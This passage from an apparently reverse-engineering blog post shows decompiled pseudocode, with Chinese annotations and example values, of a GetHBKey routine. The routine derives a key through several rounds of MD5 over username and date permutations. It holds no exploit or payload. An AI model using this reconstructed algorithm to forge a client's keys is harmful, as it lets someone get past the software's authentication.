class="number">5u</span>, <span class="string">"%m%d"</span>, (<span class="keyword">const</span> struct tm *)(pThis + <span class="number">8</span>));</span><br><span class="line">  monthDay = &amp;month_day;</span><br><span class="line">  v23 = &amp;v145;</span><br><span class="line">  monthDay += <span class="built_in">strlen</span>(monthDay);</span><br><span class="line">  v21 = ++monthDay - (<span class="keyword">char</span> *)&amp;v145;</span><br><span class="line">  lenMonthDay = monthDay - (<span class="keyword">char</span> *)&amp;v145;</span><br><span class="line">  (*(<span class="keyword">void</span> (**)(<span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, ...))(*(_DWORD *)pThis + <span class="number">4</span>))(pThis, <span class="string">"&gt;&gt;&gt; GetHBKey: %s &gt;&gt;&gt;"</span>, &amp;month_day);</span><br><span class="line">  v18 = <span class="number">1</span>;</span><br><span class="line">  SizeInBytes = lenMonthDay + lenUsername + <span class="number">2</span>;</span><br><span class="line">  mem_17 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(SizeInBytes);</span><br><span class="line">  DstBuf = mem_17;</span><br><span class="line">  <span class="built_in">memset</span>(mem_17, <span class="number">0</span>, SizeInBytes);</span><br><span class="line">  sprintf_s(DstBuf, SizeInBytes, <span class="string">"%c%s%s"</span>, pThis[<span class="number">4</span>], username, &amp;month_day);<span class="comment">// "b177628979080516"</span></span><br><span class="line">  bUsernameMonthDay = DstBuf;</span><br><span class="line">  v16 = DstBuf + <span class="number">1</span>;</span><br><span class="line">  bUsernameMonthDay += <span class="built_in">strlen</span>(bUsernameMonthDay);</span><br><span class="line">  len_bUsernameMonthDay = ++bUsernameMonthDay - (DstBuf + <span class="number">1</span>);</span><br><span class="line">  md5_bUsernameMonthDay = md5_StrWithLength(DstBuf, bUsernameMonthDay - (DstBuf + <span class="number">1</span>));<span class="comment">// 5e64fdaa6449e2abb9693f2757c11652</span></span><br><span class="line">  (*(<span class="keyword">void</span> (**)(<span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, ...))(*(_DWORD *)pThis + <span class="number">4</span>))(</span><br><span class="line">    pThis,</span><br><span class="line">    <span class="string">"[HBKEY] mdata1: %s [%s]"</span>,</span><br><span class="line">    DstBuf,</span><br><span class="line">    md5_bUsernameMonthDay);</span><br><span class="line">  <span class="built_in">memset</span>(DstBuf, <span class="number">0</span>, SizeInBytes);</span><br><span class="line">  sprintf_s(DstBuf, SizeInBytes, <span class="string">"%s%c%s"</span>, username, pThis[<span class="number">4</span>], &amp;month_day);<span class="comment">// "17762897908b0516"</span></span><br><span class="line">  username_b_MonthDay = DstBuf;</span><br><span class="line">  v14 = DstBuf + <span class="number">1</span>;</span><br><span class="line">  username_b_MonthDay += <span class="built_in">strlen</span>(username_b_MonthDay);</span><br><span class="line">  len_username_b_MonthDay = ++username_b_MonthDay - (DstBuf + <span class="number">1</span>);</span><br><span class="line">  md5_username_b_MonthDay = (_DWORD *)md5_StrWithLength(DstBuf, username_b_MonthDay - (DstBuf + <span class="number">1</span>));<span class="comment">// 16dffe496172e2fb1bdb9b2002bfb5a5</span></span><br><span class="line">  (*(<span class="keyword">void</span> (**)(<span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, ...))(*(_DWORD *)pThis + <span class="number">4</span>))(</span><br><span class="line">    pThis,</span><br><span class="line">    <span class="string">"[HBKEY] mdata2: %s [%s]"</span>,</span><br><span class="line">    DstBuf,</span><br><span class="line">    md5_username_b_MonthDay);</span><br><span class="line">  <span class="built_in">memset</span>(DstBuf, <span class="number">0</span>, SizeInBytes);</span><br><span class="line">  sprintf_s(DstBuf, SizeInBytes, <span class="string">"%s%s%c"</span>, username, &amp;month_day, pThis[<span class="number">4</span>]);<span class="comment">// "177628979080516b"</span></span><br><span class="line">  username_MonthDay_b = DstBuf;</span><br><span class="line">  v12 = DstBuf + <span class="number">1</span>;</span><br><span class="line">  username_MonthDay_b += <span class="built_in">strlen</span>(username_MonthDay_b);</span><br><span class="line">  len_username_MonthDay_b = ++username_MonthDay_b - (DstBuf + <span class="number">1</span>);</span><br><span class="line">  md5_username_MonthDay_b = (_DWORD *)md5_StrWithLength(DstBuf, username_MonthDay_b - (DstBuf + <span class="number">1</span>));<span class="comment">// 6614da7943beed0e7baafc0be7fb624c</span></span><br><span class="line">  (*(<span class="keyword">void</span> (**)(<span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, ...))(*(_DWORD *)pThis + <span class="number">4</span>))(</span><br><span class="line">    pThis,</span><br><span class="line">    <span class="string">"[HBKEY] mdata3: %s [%s]"</span>,</span><br><span class="line">    DstBuf,</span><br><span class="line">    md5_username_MonthDay_b);</span><br><span class="line">  <span class="built_in">memset</span>(DstBuf, <span class="number">0</span>, SizeInBytes);</span><br><span class="line">  sprintf_s(DstBuf, SizeInBytes, <span class="string">"%s%s%c"</span>, &amp;month_day, username, pThis[<span class="number">4</span>]);<span class="comment">// "051617762897908b"</span></span><br><span class="line">  monthDay_Username_b = DstBuf;</span><br><span class="line">  v37 = DstBuf + <span class="number">1</span>;</span><br><span class="line">  monthDay_Username_b += <span class="built_in">strlen</span>(monthDay_Username_b);</span><br><span class="line">  len_monthDay_Username_b = ++monthDay_Username_b - (DstBuf + <span class="number">1</span>);</span><br><span class="line">  md5_monthDay_Username_b = (_DWORD *)md5_StrWithLength(DstBuf, monthDay_Username_b - (DstBuf + <span class="number">1</span>));<span class="comment">// 2b28feebb48c0cb98b9f3da404fff646</span></span><br><span class="line">  (*(<span class="keyword">void</span> (**)(<span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, ...))(*(_DWORD *)pThis + <span class="number">4</span>))(</span><br><span class="line">    pThis,</span><br><span class="line">    <span class="string">"[HBKEY] mdata4: %s [%s]"</span>,</span><br><span class="line">    DstBuf,</span><br><span class="line">    md5_monthDay_Username_b);</span><br><span class="line">  md5_1 = <span class="number">0</span>;</span><br><span class="line">  md5_2 = <span class="number">0</span>;</span><br><span class="line">  md5_3 = <span class="number">0</span>;</span><br><span class="line">  md5_4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *(<span class="keyword">char</span> *)(md5_bUsernameMonthDay + <span class="number">1</span>) % <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    md5_1 = md5_bUsernameMonthDay;</span><br><span class="line">    md5_2 = md5_username_MonthDay_b;</span><br><span class="line">    md5_3 = md5_username_b_MonthDay;</span><br><span class="line">    md5_4 = md5_monthDay_Username_b;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    md5_1 = md5_bUsernameMonthDay;</span><br><span class="line">    md5_2 = md5_monthDay_Username_b;</span><br><span class="line">    md5_3 = md5_username_b_MonthDay;</span><br><span class="line">    md5_4 = md5_username_MonthDay_b;</span><br><span class="line">  &#125;</span><br><span class="line">  hbKeyGa = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;mem_64_a, <span class="number">0</span>, <span class="number">0x40</span>u);</span><br><span class="line">  md5_1_pLus3remainder4 = *(<span class="keyword">char</span> *)(md5_1 + <span class="number">3</span>) % <span class="number">4</span>;</span><br><span class="line">  <span class="comment">// 以下一连串的赋值是使 char_array_29_1 = md5_1, char_array_29_2 = md5_2</span></span><br><span class="line">  char_array_29_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_1[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_1[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_1[<span class="number">13</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_1[<span class="number">17</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_1[<span class="number">21</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_1[<span class="number">25</span>] = <span class="number">0</span>;</span><br><span class="line">  v136 = <span class="number">0</span>;</span><br><span class="line">  v137 = <span class="number">0</span>;</span><br><span class="line">  char_array_29_2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_2[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_2[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_2[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_2[<span class="number">13</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_2[<span class="number">17</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_2[<span class="number">21</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_2[<span class="number">25</span>] = <span class="number">0</span>;</span><br><span class="line">  v133 = <span class="number">0</span>;</span><br><span class="line">  v134 = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)char_array_29_1 = *(_DWORD *)md5_1;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_1[<span class="number">4</span>] = *(_DWORD *)(md5_1 + <span class="number">4</span>);</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_1[<span class="number">8</span>] = *(_DWORD *)(md5_1 + <span class="number">8</span>);</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_1[<span class="number">12</span>] = *(_DWORD *)(md5_1 + <span class="number">12</span>);</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_1[<span class="number">16</span>] = *(_DWORD *)(md5_1 + <span class="number">16</span>);</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_1[<span class="number">20</span>] = *(_DWORD *)(md5_1 + <span class="number">20</span>);</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_1[<span class="number">24</span>] = *(_DWORD *)(md5_1 + <span class="number">24</span>);</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_1[<span class="number">28</span>] = *(_DWORD *)(md5_1 + <span class="number">28</span>);</span><br><span class="line">  *(_DWORD *)char_array_29_2 = *md5_2;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_2[<span class="number">4</span>] = md5_2[<span class="number">1</span>];</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_2[<span class="number">8</span>] = md5_2[<span class="number">2</span>];</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_2[<span class="number">12</span>] = md5_2[<span class="number">3</span>];</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_2[<span class="number">16</span>] = md5_2[<span class="number">4</span>];</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_2[<span class="number">20</span>] = md5_2[<span class="number">5</span>];</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_2[<span class="number">24</span>] = md5_2[<span class="number">6</span>];</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_2[<span class="number">28</span>] = md5_2[<span class="number">7</span>];</span><br><span class="line">  v81 = md5_1_pLus3remainder4;                  <span class="comment">// 0</span></span><br><span class="line">  v82 = <span class="built_in">abs</span>(md5_1_pLus3remainder4 - <span class="number">5</span>) % <span class="number">4</span>;     <span class="comment">// 1</span></span><br><span class="line">  v8 = (md5_1_pLus3remainder4 + <span class="number">2</span>) % <span class="number">4</span>;         <span class="comment">// 2</span></span><br><span class="line">  v83 = (md5_1_pLus3remainder4 + <span class="number">2</span>) % <span class="number">4</span>;        <span class="comment">// 2</span></span><br><span class="line">  v84 = <span class="built_in">abs</span>(md5_1_pLus3remainder4 - <span class="number">3</span>);         <span class="comment">// 3</span></span><br><span class="line">  v96[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;v96[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;v97[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v98 = <span class="number">0</span>;</span><br><span class="line">  v99 = <span class="number">0</span>;</span><br><span class="line">  v100 = <span class="number">0</span>;</span><br><span class="line">  v101 = <span class="number">0</span>;</span><br><span class="line">  v102 = <span class="number">0</span>;</span><br><span class="line">  v103 = <span class="number">0</span>;</span><br><span class="line">  v104 = <span class="number">0</span>;</span><br><span class="line">  v105[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;v105[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;v106[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v107 = <span class="number">0</span>;</span><br><span class="line">  v108 = <span class="number">0</span>;</span><br><span class="line">  v109 = <span class="number">0</span>;</span><br><span class="line">  v110 = <span class="number">0</span>;</span><br><span class="line">  v111 = <span class="number">0</span>;</span><br><span class="line">  v112 = <span class="number">0</span>;</span><br><span class="line">  v113 = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)v96 = *(_DWORD *)&amp;char_array_29_1[<span class="number">8</span> * md5_1_pLus3remainder4];</span><br><span class="line">  *(_DWORD *)v97 = *(_DWORD *)&amp;char_array_29_1[<span class="number">8</span> * md5_1_pLus3remainder4 + <span class="number">4</span>];</span><br><span class="line">  *(_DWORD *)&amp;v97[<span class="number">4</span>] = *(_DWORD *)&amp;char_array_29_2[<span class="number">8</span> * v82];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v98 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_2[<span class="number">8</span> * v82 + <span class="number">4</span>];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v99 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_1[<span class="number">8</span> * v8];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v100 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_1[<span class="number">8</span> * v8 + <span class="number">4</span>];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v101 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_2[<span class="number">8</span> * v84];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v102 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_2[<span class="number">8</span> * v84 + <span class="number">4</span>];</span><br><span class="line">  *(_DWORD *)v105 = *(_DWORD *)&amp;char_array_29_2[<span class="number">8</span> * md5_1_pLus3remainder4];</span><br><span class="line">  *(_DWORD *)v106 = *(_DWORD *)&amp;char_array_29_2[<span class="number">8</span> * md5_1_pLus3remainder4 + <span class="number">4</span>];</span><br><span class="line">  *(_DWORD *)&amp;v106[<span class="number">4</span>] = *(_DWORD *)&amp;char_array_29_1[<span class="number">8</span> * v82];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v107 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_1[<span class="number">8</span> * v82 + <span class="number">4</span>];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v108 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_2[<span class="number">8</span> * v8];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v109 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_2[<span class="number">8</span> * v8 + <span class="number">4</span>];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v110 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_1[<span class="number">8</span> * v84];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v111 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_1[<span class="number">8</span> * v84 + <span class="number">4</span>];</span><br><span class="line">  mix_md5_1 = (<span class="keyword">void</span> *)md5_StrWithLength(v96, <span class="number">32</span>);<span class="comment">// 第一个参数  5e64fdaa43beed0eb9693f27e7fb624c6614da796449e2ab7baafc0b57c11652  </span></span><br><span class="line">                                                <span class="comment">// 返回值  5008ef506febfc228802dd43b99c1869</span></span><br><span class="line">                                                <span class="comment">// 为 5e64fdaa43beed0eb9693f27e7fb624c 的 md5</span></span><br><span class="line">  mix_md5_2 = (<span class="keyword">void</span> *)md5_StrWithLength(v105, <span class="number">32</span>);<span class="comment">// 第一个参数  6614da796449e2ab7baafc0b57c11652</span></span><br><span class="line">                                                <span class="comment">// 返回值  46e4a9da513469a20da82e3136f46951</span></span><br><span class="line">  sprintf_s(&amp;hbKeyGa, <span class="number">0x41</span>u, <span class="string">"%s%s"</span>, mix_md5_1, mix_md5_2);<span class="comment">// hbKeyGa = "5008ef506febfc228802dd43b99c186946e4a9da513469a20da82e3136f46951"</span></span><br><span class="line">  lp_mix_md5_1 = mix_md5_1;</span><br><span class="line">  j_j___free_base(mix_md5_1);</span><br><span class="line">  <span class="keyword">if</span> ( lp_mix_md5_1 )</span><br><span class="line">  &#123;</span><br><span class="line">    mix_md5_1 = (<span class="keyword">void</span> *)<span class="number">33059</span>;</span><br><span class="line">    v35 = <span class="number">33059</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v35 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v44 = mix_md5_2;</span><br><span class="line">  j_j___free_base(mix_md5_2);</span><br><span class="line">  <span class="keyword">if</span> ( v44 )</span><br><span class="line">  &#123;</span><br><span class="line">    mix_md5_2 = (<span class="keyword">void</span> *)<span class="number">33059</span>;</span><br><span class="line">    v34 = <span class="number">33059</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v34 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  (*(<span class="keyword">void</span> (**)(<span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, ...))(*(_DWORD *)pThis + <span class="number">4</span>))(pThis, <span class="string">"[HBKEY] ga: %s"</span>, &amp;hbKeyGa);</span><br><span class="line">  hbKeyGb = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;mem_64_b, <span class="number">0</span>, <span class="number">0x40</span>u);</span><br><span class="line">  md5_4_plus5remainer4 = *((<span class="keyword">char</span> *)md5_4 + <span class="number">5</span>) % <span class="number">4</span>;</span><br><span class="line">  <span class="comment">// 以下一连串的赋值是使 char_array_29_3 = md5_3, char_array_29_4 = md5_4</span></span><br><span class="line">  char_array_29_3[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_3[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_3[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_3[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_3[<span class="number">13</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_3[<span class="number">17</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_3[<span class="number">21</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_3[<span class="number">25</span>] = <span class="number">0</span>;</span><br><span class="line">  v139 = <span class="number">0</span>;</span><br><span class="line">  v140 = <span class="number">0</span>;</span><br><span class="line">  char_array_29_4[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_4[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_4[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_4[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_4[<span class="number">13</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_4[<span class="number">17</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_4[<span class="number">21</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_4[<span class="number">25</span>] = <span class="number">0</span>;</span><br><span class="line">  v142 = <span class="number">0</span>;</span><br><span class="line">  v143 = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)char_array_29_3 = *md5_3;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_3[<span class="number">4</span>] = md5_3[<span class="number">1</span>];</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_3[<span class="number">8</span>] = md5_3[<span class="number">2</span>];</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_3[<span class="number">12</span>] = md5_3[<span class="number">3</span>];</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_3[<span class="number">16</span>] = md5_3[<span class="number">4</span>];</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_3[<span class="number">20</span>] = md5_3[<span class="number">5</span>];</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_3[<span class="number">24</span>] = md5_3[<span class="number">6</span>];</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_3[<span class="number">28</span>] = md5_3[<span class="number">7</span>];</span><br><span class="line">  *(_DWORD *)char_array_29_4 = *md5_4;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_4[<span class="number">4</span>] = md5_4[<span class="number">1</span>];</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_4[<span class="number">8</span>] = md5_4[<span class="number">2</span>];</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_4[<span class="number">12</span>] = md5_4[<span class="number">3</span>];</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_4[<span class="number">16</span>] = md5_4[<span class="number">4</span>];</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_4[<span class="number">20</span>] = md5_4[<span class="number">5</span>];</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_4[<span class="number">24</span>] = md5_4[<span class="number">6</span>];</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_4[<span class="number">28</span>] = md5_4[<span class="number">7</span>];</span><br><span class="line">  v85 = md5_4_plus5remainer4;                   <span class="comment">// 1</span></span><br><span class="line">  v86 = <span class="built_in">abs</span>(md5_4_plus5remainer4 - <span class="number">5</span>) % <span class="number">4</span>;      <span class="comment">// 0</span></span><br><span class="line">  v9 = (md5_4_plus5remainer4 + <span class="number">2</span>) % <span class="number">4</span>;          <span class="comment">// 3</span></span><br><span class="line">  v87 = (md5_4_plus5remainer4 + <span class="number">2</span>) % <span class="number">4</span>;         <span class="comment">// 3</span></span><br><span class="line">  v88 = <span class="built_in">abs</span>(md5_4_plus5remainer4 - <span class="number">3</span>);          <span class="comment">// 2</span></span><br><span class="line">  v114[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;v114[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;v115[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v116 = <span class="number">0</span>;</span><br><span class="line">  v117 = <span class="number">0</span>;</span><br><span class="line">  v118 = <span class="number">0</span>;</span><br><span class="line">  v119 = <span class="number">0</span>;</span><br><span class="line">  v120 = <span class="number">0</span>;</span><br><span class="line">  v121 = <span class="number">0</span>;</span><br><span class="line">  v122 = <span class="number">0</span>;</span><br><span class="line">  v123[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;v123[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;v124[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v125 = <span class="number">0</span>;</span><br><span class="line">  v126 = <span class="number">0</span>;</span><br><span class="line">  v127 = <span class="number">0</span>;</span><br><span class="line">  v128 = <span class="number">0</span>;</span><br><span class="line">  v129 = <span class="number">0</span>;</span><br><span class="line">  v130 = <span class="number">0</span>;</span><br><span class="line">  v131 = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)v114 = *(_DWORD *)&amp;char_array_29_3[<span class="number">8</span> * md5_4_plus5remainer4];</span><br><span class="line">  *(_DWORD *)v115 = *(_DWORD *)&amp;char_array_29_3[<span class="number">8</span> * md5_4_plus5remainer4 + <span class="number">4</span>];</span><br><span class="line">  *(_DWORD *)&amp;v115[<span class="number">4</span>] = *(_DWORD *)&amp;char_array_29_4[<span class="number">8</span> * v86];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v116 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_4[<span class="number">8</span> * v86 + <span class="number">4</span>];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v117 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_3[<span class="number">8</span> * v9];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v118 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_3[<span class="number">8</span> * v9 + <span class="number">4</span>];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v119 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_4[<span class="number">8</span> * v88];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v120 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_4[<span class="number">8</span> * v88 + <span class="number">4</span>];</span><br><span class="line">  *(_DWORD *)v123 = *(_DWORD *)&amp;char_array_29_4[<span class="number">8</span> * md5_4_plus5remainer4];</span><br><span class="line">  *(_DWORD *)v124 = *(_DWORD *)&amp;char_array_29_4[<span class="number">8</span> * md5_4_plus5remainer4 + <span class="number">4</span>];</span><br><span class="line">  *(_DWORD *)&amp;v124[<span class="number">4</span>] = *(_DWORD *)&amp;char_array_29_3[<span class="number">8</span> * v86];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v125 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_3[<span class="number">8</span> * v86 + <span class="number">4</span>];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v126 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_4[<span class="number">8</span> * v9];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v127 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_4[<span class="number">8</span> * v9 + <span class="number">4</span>];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v128 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_3[<span class="number">8</span> * v88];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v129 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_3[<span class="number">8</span> * v88 + <span class="number">4</span>];</span><br><span class="line">  v58 = (<span class="keyword">void</span> *)md5_StrWithLength(v114, <span class="number">32</span>);    <span class="comment">// 返回值 1ed63dc9a269d8705e297c03dcda7cf0</span></span><br><span class="line">                                                <span class="comment">// 为 6172e2fb2b28feeb02bfb5a58b9f3da4 的 md5</span></span><br><span class="line">  v57 = (<span class="keyword">void</span> *)md5_StrWithLength(v123, <span class="number">32</span>);    <span class="comment">// 返回值 25928da86463ce9beba8110d2d514464</span></span><br><span class="line">                                                <span class="comment">// 为 b48c0cb916dffe4904fff6461bdb9b20 的 md5</span></span><br><span class="line"></span><br><span class="line">  sprintf_s(&amp;hbKeyGb, <span class="number">0x41</span>u, <span class="string">"%s%s"</span>, v58, v57); <span class="comment">// hbKeyGb = "1ed63dc9a269d8705e297c03dcda7cf025928da86463ce9beba8110d2d514464"</span></span><br><span class="line">  v43 = v58;</span><br><span class="line">  j_j___free_base(v58);</span><br><span class="line">  <span class="keyword">if</span> ( v43 )</span><br><span class="line">  &#123;</span><br><span class="line">    v58 = (<span class="keyword">void</span> *)<span class="number">33059</span>;</span><br><span class="line">    v22 = <span class="number">33059</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v22 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v42 = v57;</span><br><span class="line">  j_j___free_base(v57);</span><br><span class="line">  <span class="keyword">if</span> ( v42 )</span><br><span class="line">  &#123;</span><br><span class="line">    v57 = (<span class="keyword">void</span> *)<span class="number">33059</span>;</span><br><span class="line">    v32 = <span class="number">33059</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v32 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  (*(<span class="keyword">void</span> (**)(<span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, ...))(*(_DWORD *)pThis + <span class="number">4</span>))(pThis, <span class="string">"[HBKEY] gb: %s"</span>, &amp;hbKeyGb);</span><br><span class="line">  <span class="keyword">if</span> ( v95 % <span class="number">2</span> )                                <span class="comment">// 从反汇编中可看到 v95 为 hbkey_gb[7]</span></span><br><span class="line">  &#123;</span><br><span class="line">    temp1 = <span class="number">0</span>;</span><br><span 